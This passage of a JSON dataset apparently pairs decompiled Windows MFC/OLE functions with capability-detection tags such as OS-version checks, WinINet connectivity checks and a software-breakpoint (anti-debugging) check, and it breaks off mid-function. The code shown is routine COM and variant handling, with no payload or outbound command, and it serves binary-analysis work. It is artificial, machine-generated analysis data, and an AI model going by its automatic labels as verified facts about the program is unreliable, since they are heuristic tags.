        "decompiled_code": "\nvoid fcn.00459208(int32_t param_1)\n\n{\n    int32_t iVar1;\n    \n    fcn.00454564();\n    fcn.0045ac25();\n    fcn.0045a651();\n    if (param_1 == 0) {\n        iVar1 = fcn.00426925();\n        if (iVar1 != 0) {\n            if (*(iVar1 + 0x40) != NULL) {\n                (**(**(iVar1 + 0x40) + 4))(1);\n            }\n            *(iVar1 + 0x40) = 0;\n        }\n        iVar1 = fcn.0042fcbb();\n        if (*(iVar1 + 0x100) == 1) {\n            (*_sym.imp.ole32.dll_CoFreeUnusedLibraries)();\n            (*_sym.imp.ole32.dll_OleUninitialize)();\n            *(iVar1 + 0x100) = 0;\n        }\n    }\n    return;\n}\n",
        "token_count": 213
    },
    "00459417": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid fcn.00459417(void)\n\n{\n    code **extraout_ECX;\n    int32_t unaff_EBP;\n    uint var_10h;\n    uint var_4h;\n    \n    fcn.004627af(4);\n    *(unaff_EBP + -0x10) = extraout_ECX;\n    *extraout_ECX = vtable.CSharedFile.0;\n    *(unaff_EBP + -4) = 0;\n    if (extraout_ECX[8] != NULL) {\n        fcn.0045b719();\n    }\n    *(unaff_EBP + -4) = 0xffffffff;\n    fcn.0045b830();\n    fcn.00462887();\n    return;\n}\n",
        "token_count": 161
    },
    "00459cfa": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t * __cdecl fcn.00459cfa(int32_t arg_8h, int32_t *arg_ch, int32_t arg_10h)\n\n{\n    uint32_t *puVar1;\n    int32_t *piVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_4h = 0;\n    piVar2 = fcn.0042f550(0x49b05c, *(arg_8h + 0x54));\n    if (piVar2 != NULL) {\n        var_8h = (**(*piVar2 + 0xb4))();\n        if (var_8h != 0) {\n            do {\n                iVar3 = fcn.00450d9b(&var_8h);\n                var_ch = fcn.0042f550(0x49bbcc, iVar3);\n                if ((var_ch != 0) &&\n                   ((arg_10h != 0 || ((*(iVar3 + 0x58) != 0 && (*(*(iVar3 + 0x58) + 0x20) == *(arg_8h + 0x20))))))) {\n                    iVar3 = fcn.0045999d();\n                    if (iVar3 == 0) {\n                        var_4h = var_4h + 1;\n                    }\n                    else {\n                        iVar3 = fcn.00459a00(0, &var_10h);\n                        if (iVar3 != 0) {\n                            var_4h = var_4h + var_10h;\n                        }\n                        arg_ch[1] = 1;\n                    }\n                    if (arg_10h == 0) break;\n                }\n            } while (var_8h != 0);\n            if (0 < var_4h) {\n                uVar4 = *(*(*arg_ch + 0x74) + 0x1e);\n                if (uVar4 != 0xffff) {\n                    var_4h = var_4h + uVar4;\n                }\n                *(*(*arg_ch + 0x74) + 0x1e) = var_4h;\n                arg_ch[1] = 1;\n            }\n        }\n        if ((arg_ch[1] != 0) && (puVar1 = *(*arg_ch + 0x74) + 0x14,  *puVar1 = *puVar1 | 4,  arg_10h != 0)) {\n            puVar1 = *(*arg_ch + 0x74) + 0x14;\n            *puVar1 = *puVar1 | 8;\n        }\n        piVar2 = 0x1;\n    }\n    return piVar2;\n}\n",
        "token_count": 632
    },
    "00459dfa": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00459dfa(int32_t arg_8h, int32_t *arg_ch, int32_t arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t arg_ch_00;\n    uint uVar2;\n    uint var_1ch;\n    uint var_18h;\n    int32_t *var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    uint *var_4h;\n    \n    var_14h = fcn.0042f550(0x49b05c, *(arg_8h + 0x54));\n    if (var_14h != NULL) {\n        var_10h = (**(*var_14h + 0xb4))();\n        while (var_10h != 0) {\n            iVar1 = fcn.00450d9b(&var_10h);\n            var_ch = fcn.0042f550(0x49bbcc, iVar1);\n            if ((var_ch != 0) &&\n               ((arg_10h != 0 || ((*(iVar1 + 0x58) != 0 && (*(*(iVar1 + 0x58) + 0x20) == *(arg_8h + 0x20))))))) {\n                iVar1 = fcn.0045999d();\n                if (iVar1 == 0) {\n                    fcn.00459900(6, 2, 0);\n                }\n                else {\n                    var_8h = 0;\n                    iVar1 = (*_sym.imp.KERNEL32.dll_GlobalLock)(*(*(*arg_ch + 0x74) + 0xc));\n                    if (iVar1 != 0) {\n                        arg_ch_00 = (*_sym.imp.KERNEL32.dll_GlobalLock)(*(*(*arg_ch + 0x74) + 8));\n                        if (arg_ch_00 != 0) {\n                            var_8h = fcn.00414470(iVar1, arg_ch_00);\n                            if (var_8h != 0) {\n                                var_4h = (*_sym.imp.ole32.dll_CoTaskMemAlloc)(0x18);\n                                if (var_4h != NULL) {\n                                    *var_4h = 0x18;\n                                    var_4h[1] = 1;\n                                    var_4h[2] = 1;\n                                    var_4h[3] = 1;\n                                    var_4h[4] = *(*(*arg_ch + 0x74) + 0x18);\n                                    var_4h[5] = *(*(*arg_ch + 0x74) + 0x1a);\n                                    var_18h = var_4h[4];\n                                    uVar2 = 8;\n                                    if ((*(*(*arg_ch + 0x74) + 0x14) & 0x20) != 0) {\n                                        uVar2 = 0x48;\n                                    }\n                                    (**(**(var_ch + 0x80) + 0x14))\n                                              (*(var_ch + 0x80), uVar2, &var_8h, &var_4h, 0, 0, arg_ch[5], &var_1ch, \n                                               &var_18h);\n                                    (*_sym.imp.ole32.dll_CoTaskMemFree)(var_4h);\n                                }\n                                (*_sym.imp.ole32.dll_CoTaskMemFree)(var_8h);\n                            }\n                            (*_sym.imp.KERNEL32.dll_GlobalUnlock)(*(*(*arg_ch + 0x74) + 8));\n                        }\n                        (*_sym.imp.KERNEL32.dll_GlobalUnlock)(*(*(*arg_ch + 0x74) + 0xc));\n                    }\n                }\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 838
    },
    "00459fab": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl fcn.00459fab(int32_t *arg_8h, int32_t arg_ch)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t *piVar3;\n    int32_t iVar4;\n    uint *puStack36;\n    uchar *puStack32;\n    int32_t var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    puStack32 = &stack0xfffffffc;\n    if ((arg_8h != NULL) && (arg_ch != 0)) {\n        puStack32 = *(arg_8h + 0x54);\n        iVar2 = -0x7fffbffb;\n        puStack36 = 0x49b05c;\n        piVar3 = fcn.0042f550();\n        if (piVar3 != NULL) {\n            puStack32 = 0x459fef;\n            var_4h = (**(*piVar3 + 0xb4))();\n            do {\n                if (var_4h == 0) {\n                    return -0x7fffbffb;\n                }\n                puStack36 = 0x45a005;\n                puStack36 = fcn.00450d9b();\n                iVar4 = fcn.0042f550(0x49bbcc);\n            } while (iVar4 == 0);\n            arg_8h = NULL;\n            if (*(iVar4 + 0x24) != 0) {\n                puStack36 = &fcn.00459fab::arg_8h;\n                iVar2 = (****(iVar4 + 0x24))(*(iVar4 + 0x24), 0x4a1218);\n                if (iVar2 == 0) {\n                    var_ch = (*(arg_ch + 8) != 0) + 6;\n                    iVar2 = (**(*arg_8h + 0xc))(arg_8h, 0, 1, &fcn.00459fab::var_ch, 0);\n                    if (((iVar2 == 0) && ((var_8h & 3) == 3)) &&\n                       ((iVar2 = (**(*arg_8h + 0x10))(arg_8h, 0, var_ch, 1, 0, 0),  iVar2 == -0x7ffbfefd || (iVar2 == 0)\n                        ))) {\n                        iVar2 = 0;\n                    }\n                    (**(*arg_8h + 8))(arg_8h);\n                }\n            }\n        }\n        return iVar2;\n    }\n    puStack36 = 0x4b62b8;\n    fcn.0046230a(&stack0xffffffdc, 0x4a76e8);\n    pcVar1 = swi(3);\n    iVar2 = (*pcVar1)();\n    return iVar2;\n}\n",
        "token_count": 634
    },
    "0045a70b": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0045a70b(int32_t param_1)\n\n{\n    if (*(param_1 + 0x4a) != '\\0') {\n        if (*(param_1 + 0x24) != 0) {\n            (*_sym.imp.ole32.dll_CoRevokeClassObject)(*(param_1 + 0x24));\n            *(param_1 + 0x24) = 0;\n        }\n        *(param_1 + 0x4a) = 0;\n    }\n    return;\n}\n",
        "token_count": 120
    },
    "0045a764": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuchar __fastcall fcn.0045a764(int32_t *param_1)\n\n{\n    uchar uVar1;\n    \n    if (*(param_1 + 0x12) == '\\0') {\n        uVar1 = (**(*param_1 + 0x60))();\n        *(param_1 + 0x49) = uVar1;\n        *(param_1 + 0x12) = 1;\n    }\n    return *(param_1 + 0x49);\n}\n",
        "token_count": 107
    },
    "0045b027": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0045b027(int32_t param_1)\n\n{\n    if (*(param_1 + 0x20) != 0) {\n        (*_sym.imp.ole32.dll_CoRegisterMessageFilter)(0, 0);\n        *(param_1 + 0x20) = 0;\n    }\n    return;\n}\n",
        "token_count": 77
    },
    "0045b928": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0045b928(uint arg_8h, int32_t arg_ch)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t *in_ECX;\n    int32_t var_8h;\n    int32_t *var_4h;\n    \n    pcVar1 = _sym.imp.ole32.dll_CoCreateInstance;\n    var_4h = NULL;\n    in_ECX[1] = 1;\n    var_8h = (*pcVar1)(arg_8h, 0, 0x17, 0x4a0a08, &var_4h);\n    if (var_8h == -0x7ff8ffa9) {\n        var_8h = (*pcVar1)(arg_8h, 0, 7, 0x4a0a08, &var_4h);\n    }\n    if ((-1 < var_8h) && (var_8h = (*_sym.imp.ole32.dll_OleRun)(var_4h),  -1 < var_8h)) {\n        iVar2 = fcn.00431b02(var_4h, 0x49ede8);\n        *in_ECX = iVar2;\n        if (iVar2 != 0) {\n            (**(*var_4h + 8))(var_4h);\n            return 1;\n        }\n    }\n    fcn.00431b26(&var_4h);\n    if (arg_ch != 0) {\n        *(arg_ch + 8) = var_8h;\n    }\n    return 0;\n}\n",
        "token_count": 357
    },
    "0045b9c7": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0045b9c7(int32_t **param_1)\n\n{\n    int32_t *piVar1;\n    \n    piVar1 = *param_1;\n    if (piVar1 != NULL) {\n        if (param_1[1] != NULL) {\n            (**(*piVar1 + 8))(piVar1);\n        }\n        *param_1 = NULL;\n    }\n    return;\n}\n",
        "token_count": 95
    },
    "0045bd5d": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.0045bd5d(uint *param_1, uint *param_2)\n\n{\n    uint uVar1;\n    \n    if (param_1 != param_2) {\n        uVar1 = *param_2;\n        if (param_2[2] != 0) {\n            *param_2 = 0;\n        }\n        *param_1 = uVar1;\n        param_1[1] = param_2[1];\n        param_1[2] = param_2[2];\n    }\n    return;\n}\n",
        "token_count": 124
    },
    "0045bd83": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0045bd83(int32_t param_1)\n\n{\n    code *pcVar1;\n    int32_t *piVar2;\n    int32_t iVar3;\n    uint32_t **ppuVar4;\n    int32_t iVar5;\n    uint uStack28;\n    \n    iVar5 = 0;\n    if (0 < *(param_1 + 8)) {\n        do {\n            piVar2 = fcn.0045ba0c();\n            if ((*piVar2 == 0) || (iVar3 = fcn.0045ba0c(),  *(iVar3 + 4) == 0)) {\n                uStack28 = 0x4b62b8;\n                fcn.0046230a(&stack0xffffffe4, 0x4a76e8);\n                pcVar1 = swi(3);\n                (*pcVar1)();\n                return;\n            }\n            uStack28 = 0x45bdb2;\n            iVar3 = fcn.0045ba0c();\n            ppuVar4 = fcn.0045ba0c();\n            iVar5 = iVar5 + 1;\n            **ppuVar4 = **(iVar3 + 4) != 0;\n        } while (iVar5 < *(param_1 + 8));\n    }\n    return;\n}\n",
        "token_count": 290
    },
    "0045bdda": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0045bdda(code **param_1)\n\n{\n    int32_t iVar1;\n    \n    *param_1 = vtable.CArray_class_CVariantBoolPair__class_CVariantBoolPair_const__.0;\n    if (param_1[1] != NULL) {\n        iVar1 = 0;\n        if (0 < param_1[2]) {\n            do {\n                fcn.0045ba7e();\n                iVar1 = iVar1 + 1;\n            } while (iVar1 < param_1[2]);\n        }\n        fcn.004115a4(param_1[1]);\n    }\n    return;\n}\n",
        "token_count": 141
    },
    "0045bf66": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: pbstr\n// WARNING: Variable defined which should be unmapped: var_28h\n// WARNING: Variable defined which should be unmapped: var_24h\n// WARNING: Variable defined which should be unmapped: var_20h\n// WARNING: Variable defined which should be unmapped: var_1ch\n// WARNING: Variable defined which should be unmapped: var_14h\n\nvoid __cdecl fcn.0045bf66(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint lpString, uint arg_1ch)\n\n{\n    char cVar1;\n    uint8_t uVar2;\n    uint16_t uVar3;\n    uint16_t *puVar4;\n    uint32_t *puVar5;\n    int32_t *piVar6;\n    uint32_t uVar7;\n    uint *puVar8;\n    int64_t iVar9;\n    code *pcVar10;\n    code *pcVar11;\n    int16_t iVar12;\n    uint uVar13;\n    int32_t iVar14;\n    uint32_t *puVar15;\n    int32_t iVar16;\n    int32_t *extraout_ECX;\n    uint32_t **ppuVar17;\n    int32_t unaff_EBP;\n    ulong *puVar18;\n    char *pcVar19;\n    uint var_88h;\n    uint var_84h;\n    uint var_80h;\n    uint var_7ch;\n    uint var_78h;\n    uint var_70h;\n    uint var_6ch;\n    uint var_68h;\n    uint var_64h;\n    uint var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint pvargDest;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint pbstr;\n    uint var_14h;\n    uint var_10h;\n    int32_t var_4h;\n    uint uVar20;\n    \n    uVar20 = 0x7c;\n    fcn.004627af(0x7c);\n    *(unaff_EBP + -0x24) = extraout_ECX;\n    if (*extraout_ECX != 0) {\n        *(unaff_EBP + -0x54) = 0;\n        *(unaff_EBP + -0x50) = 0;\n        *(unaff_EBP + -0x4c) = 0;\n        *(unaff_EBP + -0x48) = 0;\n        *(unaff_EBP + -4) = 0;\n        fcn.00462290(unaff_EBP + -0x54, 0, 0x10);\n        if (*(unaff_EBP + 0x18) != 0) {\n            uVar13 = (*_sym.imp.KERNEL32.dll_lstrlenA)(*(unaff_EBP + 0x18));\n            *(unaff_EBP + -0x4c) = uVar13;\n        }\n        *(unaff_EBP + -0x20) = 0xfffffffd;\n        if ((*(unaff_EBP + 0xc) & 0xc) != 0) {\n            *(unaff_EBP + -0x48) = 1;\n            *(unaff_EBP + -0x50) = unaff_EBP + -0x20;\n        }\n        *(unaff_EBP + -0x68) = vtable.CArray_class_CVariantBoolPair__class_CVariantBoolPair_const__.0;\n        *(unaff_EBP + -100) = 0;\n        *(unaff_EBP + -0x58) = 0;\n        *(unaff_EBP + -0x5c) = 0;\n        *(unaff_EBP + -0x60) = 0;\n        *(unaff_EBP + -4) = 1;\n        if (*(unaff_EBP + -0x4c) != 0) {\n            iVar9 = *(unaff_EBP + -0x4c) * 0x10;\n            iVar14 = fcn.00411579(-(iVar9 >> 0x20 != 0) | iVar9);\n            *(unaff_EBP + -0x54) = iVar14;\n            fcn.00462290(iVar14, 0, *(unaff_EBP + -0x4c) << 4);\n            cVar1 = **(unaff_EBP + 0x18);\n            iVar14 = iVar14 + -0x10 + *(unaff_EBP + -0x4c) * 0x10;\n            *(unaff_EBP + -0x14) = *(unaff_EBP + 0x18);\n            *(unaff_EBP + -0x10) = iVar14;\n            if (cVar1 != '\\0') {\n                puVar18 = iVar14 + 8;\n                ppuVar17 = *(unaff_EBP + 0x1c) + -4;\n                *(unaff_EBP + -0x1c) = puVar18;\n                *(unaff_EBP + 0x1c) = *(unaff_EBP + 0x1c) + -8;\n                do {\n                    uVar2 = **(unaff_EBP + -0x14);\n                    puVar4 = *(unaff_EBP + -0x10);\n                    *puVar4 = uVar2;\n                    if ((uVar2 & 0x40) != 0) {\n                        *puVar4 = uVar2 & 0xffbf | 0x4000;\n                    }\n                    uVar3 = *puVar4;\n                    if (0x4002 < uVar3) {\n    // switch table (19 cases) at 0x45c4aa\n                        switch(uVar3) {\n                        case 0x4003:\n                        case 0x4004:\n                        case 0x4005:\n                        case 0x4006:\n                        case 0x4007:\n                        case 0x4008:\n                        case 0x4009:\n                        case 0x400a:\n                        case 0x400c:\n                        case 0x400d:\n                        case 0x4010:\n                        case 0x4011:\n                        case 0x4012:\n                        case 0x4013:\n                        case 0x4014:\n                        case 0x4015:\n                            goto code_r0x0045c1e3;\n                        case 0x400b:\n                            *(unaff_EBP + 0x1c) = *(unaff_EBP + 0x1c) + 4;\n                            ppuVar17 = ppuVar17 + 1;\n                            puVar15 = *ppuVar17;\n                            *puVar15 = -(*puVar15 != 0) & 0xffff;\n                            *puVar18 = puVar15;\n                            fcn.0045ba32(puVar15, puVar15, 0);\n                            uVar20 = *(unaff_EBP + -0x60);\n                            *(unaff_EBP + -4) = 3;\n                            fcn.0045be80();\n                            *(unaff_EBP + -4) = 1;\n                            if (*(unaff_EBP + -0x2c) != 0) {\n                                fcn.004115a4(*(unaff_EBP + -0x34));\n                            }\n                        }\n                        goto code_r0x0045c1ec;\n                    }\n                    if (uVar3 == 0x4002) {\ncode_r0x0045c1e3:\n                        *(unaff_EBP + 0x1c) = *(unaff_EBP + 0x1c) + 4;\n                        ppuVar17 = ppuVar17 + 1;\n                        *puVar18 = *ppuVar17;\n                        goto code_r0x0045c1ec;\n                    }\n    // switch table (20 cases) at 0x45c45a\n                    switch(uVar3) {\n                    case 2:\n                    case 0x12:\n                        *(unaff_EBP + 0x1c) = *(unaff_EBP + 0x1c) + 4;\n                        iVar12 = *(ppuVar17 + 1);\n                        goto code_r0x0045c16d;\n                    case 3:\n                    case 9:\n                    case 10:\n                    case 0xd:\n                    case 0x13:\n                        goto code_r0x0045c1e3;\n                    case 4:\n                        *(unaff_EBP + 0x1c) = *(unaff_EBP + 0x1c) + 8;\n                        ppuVar17 = ppuVar17 + 2;\n                        *puVar18 = **(unaff_EBP + 0x1c);\n                        break;\n                    case 5:\n                    case 7:\n                        *(unaff_EBP + 0x1c) = *(unaff_EBP + 0x1c) + 8;\n                        ppuVar17 = ppuVar17 + 2;\n                        *puVar18 = **(unaff_EBP + 0x1c);\n                        break;\n                    case 6:\n                        *(unaff_EBP + 0x1c) = *(unaff_EBP + 0x1c) + 4;\n                        ppuVar17 = ppuVar17 + 1;\n                        puVar15 = *ppuVar17;\n                        goto code_r0x0045c0b2;\n                    case 8:\n                        *(unaff_EBP + 0x1c) = *(unaff_EBP + 0x1c) + 4;\n                        ppuVar17 = ppuVar17 + 1;\n                        puVar15 = *ppuVar17;\n                        *(unaff_EBP + -0x1c) = puVar15;\n                        iVar16 = (*_sym.imp.OLEAUT32.dll_SysReAllocString)(puVar15, uVar20);\n                        iVar14 = *(unaff_EBP + -0x1c);\n                        *puVar18 = iVar16;\n                        if ((iVar14 != 0) && (iVar16 == 0)) {\n                            do {\n                                fcn.00411e0e();\ncode_r0x0045c11a:\n                                *(unaff_EBP + 0x1c) = *(unaff_EBP + 0x1c) + 4;\n                                ppuVar17 = ppuVar17 + 1;\n                                puVar15 = *ppuVar17;\n                                *(unaff_EBP + -0x1c) = puVar15;\n                                fcn.0041442c(puVar15);\n                                *(unaff_EBP + -4) = 2;\n                                iVar16 = (*_sym.imp.OLEAUT32.dll_SysReAllocString)(*(unaff_EBP + -0x18));\n                                iVar14 = *(unaff_EBP + -0x1c);\n                                *puVar18 = iVar16;\n                            } while ((iVar14 != 0) && (iVar16 == 0));\n                            **(unaff_EBP + -0x10) = 8;\n                            *(unaff_EBP + -4) = 1;\n                            fcn.00402740();\n                        }\n                        break;\n                    case 0xb:\n                        *(unaff_EBP + 0x1c) = *(unaff_EBP + 0x1c) + 4;\n                        iVar12 = -(ppuVar17[1] != NULL);\ncode_r0x0045c16d:\n                        ppuVar17 = ppuVar17 + 1;\n                        *puVar18 = iVar12;\n                        break;\n                    case 0xc:\n                        *(unaff_EBP + 0x1c) = *(unaff_EBP + 0x1c) + 4;\n                        puVar15 = *(unaff_EBP + -0x10);\n                        ppuVar17 = ppuVar17 + 1;\n                        puVar5 = *ppuVar17;\n                        *puVar15 = *puVar5;\n                        puVar15[1] = puVar5[1];\n                        puVar15[2] = puVar5[2];\n                        puVar15[3] = puVar5[3];\n                        puVar18 = *(unaff_EBP + -0x1c);\n                        break;\n                    case 0xe:\n                        goto code_r0x0045c11a;\n                    case 0x10:\n                    case 0x11:\n                        *(unaff_EBP + 0x1c) = *(unaff_EBP + 0x1c) + 4;\n                        ppuVar17 = ppuVar17 + 1;\n                        *puVar18 = *ppuVar17;\n                        break;\n                    case 0x14:\n                    case 0x15:\n                        puVar15 = *(unaff_EBP + 0x1c) + 8;\n                        *(unaff_EBP + 0x1c) = puVar15;\n                        ppuVar17 = ppuVar17 + 2;\ncode_r0x0045c0b2:\n                        *puVar18 = *puVar15;\n                        *(puVar18 + 4) = puVar15[1];\n                    }\ncode_r0x0045c1ec:\n                    *(unaff_EBP + -0x10) = *(unaff_EBP + -0x10) + -0x10;\n                    puVar18 = puVar18 + -2;\n                    *(unaff_EBP + -0x14) = *(unaff_EBP + -0x14) + 1;\n                    cVar1 = **(unaff_EBP + -0x14);\n                    *(unaff_EBP + -0x1c) = puVar18;\n                } while (cVar1 != '\\0');\n            }\n        }\n        iVar16 = 0;\n        iVar14 = 0;\n        fcn.00439e50(unaff_EBP + -0x44);\n        if (*(unaff_EBP + 0x10) != 0) {\n            iVar14 = unaff_EBP + -0x44;\n        }\n        fcn.00462290(unaff_EBP + -0x88, 0, 0x20);\n        piVar6 = **(unaff_EBP + -0x24);\n        *(unaff_EBP + -0x28) = 0xffffffff;\n        uVar20 = (**(*piVar6 + 0x18))\n                           (piVar6, *(unaff_EBP + 8), 0x49f9b8, 0, *(unaff_EBP + 0xc), unaff_EBP + -0x54, iVar14, \n                            unaff_EBP + -0x88, unaff_EBP + -0x28);\n        *(unaff_EBP + 0xc) = uVar20;\n        fcn.0045bd83();\n        if (*(unaff_EBP + -0x4c) != 0) {\n            iVar14 = *(unaff_EBP + -0x4c) * 0x10 + -0x10 + *(unaff_EBP + -0x54);\n            for (pcVar19 = *(unaff_EBP + 0x18); *pcVar19 != '\\0'; pcVar19 = pcVar19 + 1) {\n                if ((*pcVar19 == '\\b') || (*pcVar19 == '\\x0e')) {\n                    (*_sym.imp.OLEAUT32.dll_VariantCopy)(iVar14);\n                }\n                iVar14 = iVar14 + -0x10;\n            }\n        }\n        fcn.004115a4(*(unaff_EBP + -0x54));\n        *(unaff_EBP + -0x54) = 0;\n        if (-1 < *(unaff_EBP + 0xc)) goto code_r0x0045c377;\n        var_4h = unaff_EBP + -0x44;\n        (*_sym.imp.OLEAUT32.dll_VariantCopy)();\n        if (*(unaff_EBP + 0xc) == -0x7ffdfff7) goto code_r0x0045c2c3;\n        while( true ) {\n            fcn.00413258(var_4h);\ncode_r0x0045c2c3:\n            if (*(unaff_EBP + -0x70) != iVar16) {\n                (**(unaff_EBP + -0x70))(unaff_EBP + -0x88);\n            }\n            iVar14 = fcn.00411579(0x20);\n            *(unaff_EBP + 0x14) = iVar14;\n            *(unaff_EBP + -4) = 4;\n            if (iVar14 != iVar16) {\n                iVar16 = fcn.0045dc4c(iVar16, iVar16, *(unaff_EBP + -0x88));\n            }\n            pcVar11 = _sym.imp.OLEAUT32.dll_VariantInit;\n            *(unaff_EBP + -4) = 1;\n            iVar14 = (*pcVar11)(*(unaff_EBP + -0x84));\n            if (iVar14 != 0) {\n                fcn.0041396f(*(unaff_EBP + -0x84));\n            }\n            pcVar10 = _sym.imp.OLEAUT32.dll_SysStringLen;\n            (*_sym.imp.OLEAUT32.dll_SysStringLen)(*(unaff_EBP + -0x84));\n            iVar14 = (*pcVar11)(*(unaff_EBP + -0x80));\n            if (iVar14 != 0) {\n                fcn.0041396f(*(unaff_EBP + -0x80));\n            }\n            (*pcVar10)(*(unaff_EBP + -0x80));\n            iVar14 = (*pcVar11)(*(unaff_EBP + -0x7c));\n            if (iVar14 != 0) {\n                fcn.0041396f(*(unaff_EBP + -0x7c));\n            }\n            (*pcVar10)(*(unaff_EBP + -0x7c));\n            *(iVar16 + 0x10) = *(unaff_EBP + -0x78);\n            *(iVar16 + 0x1c) = *(unaff_EBP + -0x6c);\n            *(unaff_EBP + 0x14) = iVar16;\n            fcn.0046230a(unaff_EBP + 0x14, 0x4affe0);\ncode_r0x0045c377:\n            uVar7 = *(unaff_EBP + 0x10);\n            if (uVar7 == iVar16) goto code_r0x0045c434;\n            if ((uVar7 == 0xc) ||\n               (var_4h = (*_sym.imp.OLEAUT32.dll_VariantTimeToDosDateTime)\n                                   (unaff_EBP + -0x44, unaff_EBP + -0x44, iVar16, uVar7),  iVar16 <= var_4h)) break;\n            (*_sym.imp.OLEAUT32.dll_VariantCopy)(unaff_EBP + -0x44);\n        }\n    // switch table (20 cases) at 0x45c4f6\n        switch(uVar7 & 0xffff) {\n        case 2:\n        case 0x12:\n            **(unaff_EBP + 0x14) = *(unaff_EBP + -0x3c);\n            break;\n        case 3:\n        case 9:\n        case 10:\n        case 0xd:\n        case 0x13:\n            **(unaff_EBP + 0x14) = *(unaff_EBP + -0x3c);\n            break;\n        case 4:\n            **(unaff_EBP + 0x14) = *(unaff_EBP + -0x3c);\n            break;\n        case 5:\n        case 7:\n            **(unaff_EBP + 0x14) = *(unaff_EBP + -0x3c);\n            break;\n        case 6:\n        case 0x14:\n        case 0x15:\n            puVar8 = *(unaff_EBP + 0x14);\n            *puVar8 = *(unaff_EBP + -0x3c);\n            puVar8[1] = *(unaff_EBP + -0x38);\n            break;\n        case 8:\n            fcn.00431aad(*(unaff_EBP + 0x14), *(unaff_EBP + -0x3c));\n            (*_sym.imp.OLEAUT32.dll_SysStringLen)(*(unaff_EBP + -0x3c));\n            break;\n        case 0xb:\n            **(unaff_EBP + 0x14) = *(unaff_EBP + -0x3c) != iVar16;\n            break;\n        case 0xc:\n            puVar8 = *(unaff_EBP + 0x14);\n            *puVar8 = *(unaff_EBP + -0x44);\n            